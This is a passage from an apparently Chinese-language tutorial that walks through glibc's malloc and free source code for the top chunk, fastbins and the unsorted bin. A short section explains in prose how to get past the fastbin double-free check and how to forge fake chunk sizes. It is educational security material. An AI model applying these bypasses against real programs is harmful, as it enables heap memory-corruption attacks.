</code>整理<code>fastbins</code></p><ul><li><p>判断完不属于<code>smallbin</code>之后说明空间在<code>largebin</code>,不会立即检查<code>largebin</code>而是调用<code>malloc_consolidate </code>将<code>fastbins </code>里面的空闲 <code>chunk </code>合并整理到 <code>unsortedbin </code>中</p></li><li><p>判断<code>fastbins </code>为空，跳过</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else    &#123;      idx &#x3D; largebin_index (nb);      if (have_fastchunks (av))        malloc_consolidate (av);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>尝试切割top分配空间</p><ul><li><p>获取到 top chunk 的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; av-&gt;top;size &#x3D; chunksize (victim);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>victim</code>指向<code>av</code>内存空间中的<code>top chunk</code></p></li><li><p>和申请的空间大小做比较：如果 top chunk 在满足分配后还能剩余空间大小大于最小的 chunk 的大小，则开始进行切割，并把剩余的 chunk 作为新的 top chunk</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb + MINSIZE))        &#123;          remainder_size &#x3D; size - nb;          remainder &#x3D; chunk_at_offset (victim, nb);          av-&gt;top &#x3D; remainder;          set_head (victim, nb | PREV_INUSE |                    (av !&#x3D; &amp;main_arena ? NON_MAIN_ARENA : 0));          set_head (remainder, remainder_size | PREV_INUSE);          check_malloced_chunk (av, victim, nb);          void *p &#x3D; chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>否则先判断fastbin是否非空，非空则重整理，fastbin和unsorted bin</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else if (have_fastchunks (av))        &#123;          malloc_consolidate (av);          &#x2F;* restore original bin index *&#x2F;          if (in_smallbin_range (nb))            idx &#x3D; smallbin_index (nb);          else            idx &#x3D; largebin_index (nb);        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不为空，调用sysmalloc直接向系统申请内存</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else        &#123;          void *p &#x3D; sysmalloc (nb, av);          if (p !&#x3D; NULL)            alloc_perturb (p, bytes);          return p;        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><h2 id="free到fastbin"><a href="#free到fastbin" class="headerlink" title="free到fastbin"></a>free到fastbin</h2><h3 id="源程序-1"><a href="#源程序-1" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x30);free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-1"><a href="#运行过程-1" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>由源码中<code>strong_alias (__libc_free, free)</code>得出：<code>free</code>就是<code>__libc_free</code>的别名</p></li><li><p>调用<code>__libc_free</code>函数，传入的参数<code>*mem</code>是要释放的堆的<code>user data</code>地址的指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void __libc_free(void *mem)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>__free_hook</code>中的函数来完成释放，默认值为0，没有初始化的过程</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void (*hook) (void *, const void *)    &#x3D; atomic_forced_read (__free_hook);  if (__builtin_expect (hook !&#x3D; NULL, 0))    &#123;      (*hook)(mem, RETURN_ADDRESS (0));      return;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断传入的指针值是否为0，free（0）无效</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (mem &#x3D;&#x3D; 0)                              &#x2F;* free(0) has no effect *&#x2F;    return;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>调用<code>mem2chunk</code>函数，将<code>user data</code>的指针<code>mem</code>转换为对应的<code>chunk head</code>指针<code>p</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;mem2chunk函数宏定义&#x2F;&#x2F;chunk head与user data之间相差prev_size和size字段，分别占一个机器字节，因此从user data到chunlk head只需减去两个机器字长，即2*SIZE_SZ#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">p &#x3D; mem2chunk (mem);&#x2F;&#x2F;p指向chunk head<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>chunk_is_mmapped</code>函数判断该chunk是否由<code>mmap</code>分配</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;chunk_is_mmapped宏定义&#x2F;&#x2F;检查size最低三位中的标志位，若为2则是mmap分配的内存#define IS_MMAPPED 0x2#define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>补充</strong>：使用<code>malloc</code> 、<code>free</code> 等函数动态申请和释放内存时真正与系统交互用于系统调用的函数主要是 <code>(s)brk</code> 函数以及 <code>mmap</code></p><ul><li><code>brk</code>用于分配小空间，将数据段(.data)的最高地址指针<code>_edata</code>往高地址推</li><li><code>mmap</code>用于分配大空间，是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存</li><li>这两种方式分配的都是虚拟内存，没有分配物理内存</li></ul><p>源程序中释放的堆不是由<code>mmap</code>分配的因此跳过<code>if</code>中的内容</p></li><li><p>调用<code>arena_for_chunk</code>获取该<code>chunk</code>的分配区指针<code>ar_ptr</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">ar_ptr &#x3D; arena_for_chunk (p);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>调用<code>_int_free</code>函数释放堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">_int_free (ar_ptr, p, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;_int_free函数定义，参数中的mstate表示的是malloc_state结构体也就是main_arena的结构体，mchunkptr表示的是malloc_chunk的结构体，av指向该chunk的分配区，p指向该chunk的chunk headstatic void _int_free (mstate av, mchunkptr p, int have_lock)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>调用<code>chunksize</code>函数获取该<code>chunk</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;chunksize宏定义，取p所指向的chunk的size位#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">size &#x3D; chunksize (p);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查地址的合理性</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;分配器永远不会在地址空间的末尾环绕，因此我们可以排除一些可能出现的尺寸值&#x2F;&#x2F;判断堆地址不在空间末尾且是对齐的，否则报无效地址的错误&#x2F;&#x2F;若互斥锁开启则关闭互斥锁if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)      || __builtin_expect (misaligned_chunk (p), 0))    &#123;      errstr &#x3D; &quot;free(): invalid pointer&quot;;    errout:      if (!have_lock &amp;&amp; locked)        (void) mutex_unlock (&amp;av-&gt;mutex);      malloc_printerr (check_action, errstr, chunk2mem (p), av);      return;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>检查大小合理性</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;判断堆大小是大于最小值&#x2F;&#x2F;判断大小对齐，即是机器字长的整数倍数if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))    &#123;      errstr &#x3D; &quot;free(): invalid size&quot;;      goto errout;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;MINSIZE宏定义&#x2F;&#x2F;MALLOC_ALIGN_MASK &#x3D; 两倍机器字长-1，结果将MIN_CHUNK_SIZE进行两倍机器字长对齐#define MINSIZE  \  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;aligned_OK宏定义，结果是判断是否是机器字长的整数倍#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) &#x3D;&#x3D; 0)&#x2F;&#x2F;MALLOC_ALIGN_MASK宏定义#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;MIN_CHUNK_SIZE宏定义#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断堆是否在<code>fastbin</code>里</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;大小小于等于fastbin最大值if ((unsigned long)(size) &lt;&#x3D; (unsigned long)(get_max_fast ())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>检查要释放的堆的下一个堆的大小是否合法</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;互斥锁是否开启&#x2F;&#x2F;下一个堆的大小是否小于最小堆大小或大于该内存池的user data最大值&#x2F;&#x2F;av指向chunk分配区if (have_lock    || (&#123; assert (locked &#x3D;&#x3D; 0);  mutex_lock(&amp;av-&gt;mutex);  locked &#x3D; 1;  chunk_at_offset (p, size)-&gt;size &lt;&#x3D; 2 * SIZE_SZ    || chunksize (chunk_at_offset (p, size)) &gt;&#x3D; av-&gt;system_mem;      &#125;))  &#123;    errstr &#x3D; &quot;free(): invalid next size (fast)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果互斥锁开启则关闭</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (! have_lock)  &#123;    (void)mutex_unlock(&amp;av-&gt;mutex);    locked &#x3D; 0;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>清空堆中的内容</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;free_perturb函数定义&#x2F;&#x2F;p指向user data， n 为实际堆实际大小，即不含chunk head&#x2F;&#x2F;perturb：扰乱&#x2F;&#x2F;perturb_byte为0时，将堆的user data部分清空为0static voidfree_perturb (char *p, size_t n)&#123;  if (__glibc_unlikely (perturb_byte))    memset (p, perturb_byte, n);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设置分配区的标志位表示<code>fastbin</code>有空闲<code>chunk</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;av的标志位设置为1set_fastchunks(av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;set_fastchunks宏定义#define set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)&#x2F;&#x2F;FASTCHUNKS_BIT宏定义#define FASTCHUNKS_BIT        (1U)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>根据<code>size</code>获得即将添加的chunk在fastbin中的索引<code>idx</code>，并通过该索引获得头指针<code>fb</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;fastbin_index宏定义#define fastbin_index宏定义(sz) \  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ &#x3D;&#x3D; 8 ? 4 : 3)) - 2)   &#x2F;&#x2F;SIZE_SZ等于一个机器字长，32位右移1，64位右移2（除）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;fb指向chunk大小所在的fastbin链的头指针unsigned int idx &#x3D; fastbin_index(size);fb &#x3D; &amp;fastbin (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>检查<code>double free</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;如果头指针等于要释放的堆，则判定double free&#x2F;&#x2F;old等于要释放的堆所属的fastbin链的头结点mchunkptr old &#x3D; *fb, old2;unsigned int old_idx &#x3D; ~0u;if (__builtin_expect (old &#x3D;&#x3D; p, 0))  &#123;    errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将<code>chunk</code>添加到顶部之后检查顶部的 <code>fastbin </code>块的大小是否与我们要添加的块的大小相同。只有在我们拥有锁的情况下，我们才能解除对<code> OLD</code> 的引用</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;检查互斥锁&#x2F;&#x2F;old_idx为头结点所在的fastbin链的下标&#x2F;&#x2F;该chunk添加到fastbin中，即将fd设置为原来的头结点，并且把该chunk设置为头指针&#x2F;&#x2F;idx和old_idx不相等的时候报错if (have_lock &amp;&amp; old !&#x3D; NULL)  old_idx &#x3D; fastbin_index(chunksize(old));p-&gt;fd &#x3D; old2 &#x3D; old;      &#125;    while ((old &#x3D; catomic_compare_and_exchange_val_rel (fb, p, old2)) !&#x3D; old2);    if (have_lock &amp;&amp; old !&#x3D; NULL &amp;&amp; __builtin_expect (old_idx !&#x3D; idx, 0))      &#123;errstr &#x3D; &quot;invalid fastbin entry (free)&quot;;goto errout;      &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从fastbin取出chunk"><a href="#从fastbin取出chunk" class="headerlink" title="从fastbin取出chunk"></a>从fastbin取出chunk</h2><h3 id="源程序-2"><a href="#源程序-2" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x30);free(p);malloc(0x30);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-2"><a href="#运行过程-2" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行至<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的判断申请实际大小所在的<code>fastbin</code>链表的第一个结点是否为空</p></li><li><p>第一个结点不为空，则更改链表头指向第二个结点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">do       &#123;         victim &#x3D; pp;         if (victim &#x3D;&#x3D; NULL)           break;       &#125;     while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))            !&#x3D; victim);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>安全性检查：</strong>判断所取到的堆的大小所在<code>fastbin</code>的下标与申请的实际大小应该在的下标是否一致</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))           &#123;             errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;           errout:             malloc_printerr (check_action, errstr, chunk2mem (victim), av);             return NULL;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>计算并返回从fastbin获取的chunk的user data起始地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *p &#x3D; chunk2mem (victim);alloc_perturb (p, bytes);return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="fastbin相关漏洞和绕过利用原理"><a href="#fastbin相关漏洞和绕过利用原理" class="headerlink" title="fastbin相关漏洞和绕过利用原理"></a>fastbin相关漏洞和绕过利用原理</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>在<a href="#free%E5%88%B0fastbin">free到fastbin</a>中有对<code>double free</code>的判断机制</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;如果头指针等于要释放的堆，则判定double free&#x2F;&#x2F;old等于要释放的堆所属的fastbin链的头结点mchunkptr old &#x3D; *fb, old2;unsigned int old_idx &#x3D; ~0u;if (__builtin_expect (old &#x3D;&#x3D; p, 0))  &#123;    errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>原理：</strong>连续两次释放同一个堆</p><p><strong>利用：</strong>判断要释放的堆所属的<code>fastbin</code>链的第一个<code>chunk</code>地址是否和要释放的堆的地址相同，若相同则判定为<code>double free</code>，因此绕过只需要保证二者地址不同即可，所以绕过方法是在第二次释放之前先释放一个属于这个链的堆使得第一个地址不是实际要释放的地址，第二次释放需要释放的地址时链表第一个地址就是两次释放之间释放的堆的地址，不会触发<code>double free</code>的报错。</p><h3 id="绕过对取出的堆的大小检查"><a href="#绕过对取出的堆的大小检查" class="headerlink" title="绕过对取出的堆的大小检查"></a>绕过对取出的堆的大小检查</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))           &#123;             errstr &#x3D; &quot;malloc(): memory corruption (fast)&quot;;           errout:             malloc_printerr (check_action, errstr, chunk2mem (victim), av);             return NULL;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用<code>find_fake_fast</code>工具寻找离所求地址最近的可以伪造<code>size</code>位符合要求的堆</p><h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h2 id="free到unsorted-bin"><a href="#free到unsorted-bin" class="headerlink" title="free到unsorted bin"></a>free到unsorted bin</h2><h3 id="源程序-3"><a href="#源程序-3" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-3"><a href="#运行过程-3" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行至<a href="#free%E5%88%B0fastbin">free到fastbin</a>的判断堆是否在<code>fastbin</code>里</p></li><li><p>不在<code>fastbin</code>之后判断是否是<code>mmap</code>分配的，不是则继续运行</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else if (!chunk_is_mmapped(p)) &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果没有互斥锁则加锁</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (! have_lock) &#123;      (void)mutex_lock(&amp;av-&gt;mutex);      locked &#x3D; 1;    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获得下一个<code>chunk</code>的大小和指针到<code>p</code>和<code>size</code>，即<code>p</code>指向下一个<code>chunk</code>的地址，<code>size</code>为下一个堆的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextchunk &#x3D; chunk_at_offset(p, size);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>检查该地址是否在分配区顶部，是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (p &#x3D;&#x3D; av-&gt;top))      &#123;errstr &#x3D; &quot;double free or corruption (top)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>av</code>为堆所在的分配区地址</p></li><li><p>判断下一个堆是否超出分配区的范围，判断方式：判断下一个堆的地址是否大于等于<code>av-&gt;top</code>加上<code>av-&gt;top</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (contiguous (av)  &amp;&amp; (char *) nextchunk  &gt;&#x3D; ((char *) av-&gt;top + chunksize(av-&gt;top)), 0))     &#123;errstr &#x3D; &quot;double free or corruption (out)&quot;;goto errout;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断要释放的堆是否在<code>inuse</code>状态，判断方式：获取下一个堆的<code>prev_inuse</code>值</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (!prev_inuse(nextchunk)))      &#123;errstr &#x3D; &quot;double free or corruption (!prev)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取下一个堆的大小并且判断下一个堆的大小是否合法</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextsize &#x3D; chunksize(nextchunk);    if (__builtin_expect (nextchunk-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)|| __builtin_expect (nextsize &gt;&#x3D; av-&gt;system_mem, 0))      &#123;errstr &#x3D; &quot;free(): invalid next size (normal)&quot;;goto errout;      &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>清空堆中的内容</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断前一个堆是否被释放，如果被释放了则和前一个堆合并：获取前一个堆的大小，加到当前要释放的堆的<code>size</code>，并通过<a href="#unlink">unlink</a>将该chunk从空闲链表中脱离</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!prev_inuse(p)) &#123;      prevsize &#x3D; p-&gt;prev_size;      size +&#x3D; prevsize;      p &#x3D; chunk_at_offset(p, -((long) prevsize));      unlink(av, p, bck, fwd);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断下一个堆是否是<code>top chunk</code>,若是则与<code>top chunk</code>合并，<strong>结束释放过程</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!prev_inuse(p)) &#123;...&#125;else &#123;      size +&#x3D; nextsize;      set_head(p, size | PREV_INUSE);      av-&gt;top &#x3D; p;      check_chunk(av, p);    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果不是，获取下一个堆的<code>inuse</code>位</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">nextinuse &#x3D; inuse_bit_at_offset(nextchunk, nextsize);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断下一个堆是否在使用，若已经被释放则合并到当前要释放的堆，并通过<code>unlink</code>将该chunk从空闲链表中脱离</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>若还在使用则将<code>prev_inuse</code>设为0表示当前堆已经被释放了</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#125; elseclear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取分配区中的<code>unsorted_bin</code>的第一个堆的地址到<code>bck</code>，获取头结点<code>fwd</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; unsorted_chunks(av);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>检查<code>fwd</code>的<code>bk</code>是否是<code>bck</code>，不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))&#123;  errstr &#x3D; &quot;free(): corrupted unsorted chunks&quot;;  goto errout;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将堆连接到<code>unsorted bin</code>中，即将要释放的堆的<code>fd</code>改成<code>fwd</code>，<code>bk</code>改成<code>bck</code>，<code>bck</code>的<code>fd</code>和<code>fwd</code>的<code>bk</code>设置成<code>p</code>，将<code>p</code>连到<code>fwd</code>和<code>bck</code>之间成为第一个，并且堆大小不在<code>smallbin</code>范围内时设置其<code>fd_nextsize</code>和<code>bk_nextsize</code>为NULL</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">  p-&gt;fd &#x3D; fwd;     p-&gt;bk &#x3D; bck;     if (!in_smallbin_range(size))&#123;  p-&gt;fd_nextsize &#x3D; NULL;  p-&gt;bk_nextsize &#x3D; NULL;&#125;     bck-&gt;fd &#x3D; p;     fwd-&gt;bk &#x3D; p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从unsorted-bin取出chunk"><a href="#从unsorted-bin取出chunk" class="headerlink" title="从unsorted bin取出chunk"></a>从unsorted bin取出chunk</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x100);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-4"><a href="#运行过程-4" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的调用<code>malloc_consolidate </code>整理<code>fastbins</code></p></li><li><p>进入整理<code>unsorted bin</code>的大循环，一边整理一边查找合适的<code>chunk</code>，找到即返回，结束创建过程</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int iters &#x3D; 0;while ((victim &#x3D; unsorted_chunks (av)-&gt;bk) !&#x3D; unsorted_chunks (av))    bck &#x3D; victim-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>结束条件：遍历整理完<code>unsorted bin</code>或整理次数超过10000 </p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define MAX_ITERS       10000          if (++iters &gt;&#x3D; MAX_ITERS)            break;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的第二个堆并且进行大小检查</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; victim-&gt;bk;if (__builtin_expect (victim-&gt;size &lt;&#x3D; 2 * SIZE_SZ, 0)    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))  malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                   chunk2mem (victim), av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的第一个<code>chunk</code>的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">size &#x3D; chunksize (victim);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将 